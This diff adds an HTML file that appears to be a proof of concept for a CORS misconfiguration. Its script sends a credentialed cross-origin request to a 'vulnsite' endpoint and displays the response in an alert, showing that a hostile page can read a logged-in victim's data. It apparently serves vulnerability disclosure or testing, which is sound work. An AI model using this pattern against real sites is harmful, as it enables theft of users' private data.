@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET","http://vulnsite/neweb3/getContent.php",true);
+xhr.withCredentials = true;
+xhr.onreadystatechange = function() {
+  if(xhr.readyState == 4) {
+    alert(xhr.responseText);
+  }
+}
+xhr.send();
+</script>
+</body>
+</html>
